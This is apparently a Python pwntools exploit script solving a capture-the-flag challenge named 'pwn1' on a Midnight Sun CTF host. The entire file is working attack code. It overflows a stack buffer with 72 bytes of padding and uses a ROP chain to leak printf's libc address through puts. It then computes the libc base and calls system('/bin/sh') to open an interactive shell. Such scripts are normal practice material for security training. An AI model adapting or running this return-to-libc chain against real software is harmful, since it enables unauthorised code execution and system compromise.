#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./pwn1')
libc = ELF("./libc.so")

host = args.HOST or 'pwn1-01.play.midnightsunctf.se'
port = int(args.PORT or 10001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

io = start(env={"LD_PRELOAD": "./libc.so"})
io.recvuntil("buffer: ")


pop_rdi = 0x400783 # : pop rdi ; ret
ret = 0x400784 # : ret
main = 0x400698

# leak libc 
payload = (
    b"A" * 72 +
    p64(pop_rdi) +
    p64(exe.got["printf"]) +
    p64(exe.plt["puts"]) +
    p64(main)

)
io.sendline(payload)
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.printf

log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)

io.recvuntil("buffer: ")
payload = (
    b"A" * 72 +
    p64(ret) +
    p64(pop_rdi) +
    p64(next(libc.search(b"/bin/sh"))) +
    p64(libc.sym.system)
)
io.sendline(payload)

io.interactive()

